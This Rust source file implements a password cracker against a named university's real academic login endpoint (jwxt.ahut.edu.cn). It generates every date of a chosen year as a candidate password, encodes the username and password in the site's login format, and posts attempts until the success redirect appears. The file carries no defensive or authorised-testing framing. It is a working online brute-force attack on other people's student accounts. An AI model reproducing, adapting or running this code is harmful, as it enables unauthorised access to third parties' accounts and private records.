use base64::{engine::general_purpose, Engine as _};
#[derive(serde::Serialize, serde::Deserialize, Clone)]
pub struct CrackProgress {
    pub current_password: String,
    pub total_attempted: i32,
    pub total_passwords: i32,
    pub found: bool,
    pub result: Option<String>,
    pub elapsed_seconds: i32,
}

pub struct PasswordCracker {
    username: String,
    year: i32,
    login_url: String,
    success_url: String,
}

impl PasswordCracker {
    pub fn new(username: String, year: i32) -> Self {
        PasswordCracker {
            username,
            year,
            login_url: "http://jwxt.ahut.edu.cn/jsxsd/xk/LoginToXk".to_string(),
            success_url: "http://jwxt.ahut.edu.cn/jsxsd/framework/xsMain.jsp".to_string(),
        }
    }

    pub fn generate_date_passwords(&self) -> Vec<String> {
        let mut passwords = Vec::new();
        
        for month in 1..=12 {
            let days_in_month = match month {
                2 => {
                    let is_leap = (self.year % 4 == 0 && self.year % 100 != 0) 
                        || (self.year % 400 == 0);
                    if is_leap { 29 } else { 28 }
                }
                4 | 6 | 9 | 11 => 30,
                _ => 31,
            };

            for day in 1..=days_in_month {
                let password = format!("{}{:02}{:02}", self.year, month, day);
                passwords.push(password);
            }
        }

        passwords
    }

    pub fn encode_login_params(&self, plain_password: &str) -> String {
        let username_bytes = self.username.as_bytes();
        let username_encoded = general_purpose::STANDARD.encode(username_bytes);

        let password_bytes = plain_password.as_bytes();
        let password_encoded = general_purpose::STANDARD.encode(password_bytes);

        format!("{}%%%{}", username_encoded, password_encoded)
    }

    pub async fn try_password(
        &self,
        plain_password: &str,
        client: &reqwest::Client,
    ) -> Result<bool, String> {
        let encoded_value = self.encode_login_params(plain_password);

        let params = [
            ("userAccount", self.username.as_str()),
            ("userPassword", ""),
            ("encoded", encoded_value.as_str()),
            ("pwdstr1", ""),
            ("pwdstr2", ""),
        ];

        match tokio::time::timeout(
            std::time::Duration::from_secs(20),
            client.post(&self.login_url).form(&params).send()
        ).await {
            Ok(Ok(response)) => {
                let response_url = response.url().to_string();
                match response.text().await {
                    Ok(text) => {
                        if text.contains("用户名或密码错误") {
                            Ok(false)
                        } else if response_url == self.success_url {
                            Ok(true)
                        } else {
                            // 未知状态，返回false继续尝试
                            Ok(false)
                        }
                    }
                    Err(_) => Ok(false),
                }
            }
            Ok(Err(_)) => Err("Network error".to_string()),
            Err(_) => Err("Timeout".to_string()),
        }
    }
}
